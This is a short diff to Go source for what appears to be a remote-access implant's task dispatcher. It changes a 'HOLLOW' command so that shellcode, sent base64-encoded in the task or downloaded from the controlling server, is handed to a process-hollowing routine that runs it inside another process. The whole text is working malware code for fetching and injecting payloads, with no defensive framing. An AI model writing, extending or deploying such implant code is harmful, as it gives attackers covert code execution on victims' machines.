@@ -676,7 +676,8 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, out, errStr)
 
 	case "HOLLOW":
-		// Args JSON: {"target":"<proc_path_optional>","payload":"<uploaded_filename>"}
+		// Args JSON: {"target":"<proc_path_optional>","payload":"<uploaded_filename_optional>"}
+		// Shellcode bytes may arrive in task.Payload (base64) or be downloaded by name from args.payload.
 		var ha struct {
 			Target  string `json:"target"`
 			Payload string `json:"payload"`
@@ -685,10 +686,20 @@ func dispatchTask(t transport, task taskWire) {
 			t.sendResult(task.ID, "", "bad HOLLOW args: "+err.Error())
 			return
 		}
-		sc, err := t.downloadFile(ha.Payload)
-		if err != nil {
-			t.sendResult(task.ID, "", "hollow: download '"+ha.Payload+"': "+err.Error())
-			return
+		var sc []byte
+		var err error
+		if task.Payload != "" {
+			sc, err = base64.StdEncoding.DecodeString(task.Payload)
+			if err != nil {
+				t.sendResult(task.ID, "", "hollow: decode payload: "+err.Error())
+				return
+			}
+		} else {
+			sc, err = t.downloadFile(ha.Payload)
+			if err != nil {
+				t.sendResult(task.ID, "", "hollow: download '"+ha.Payload+"': "+err.Error())
+				return
+			}
 		}
 		out, err := hollowProcess(ha.Target, sc)
 		errStr := ""
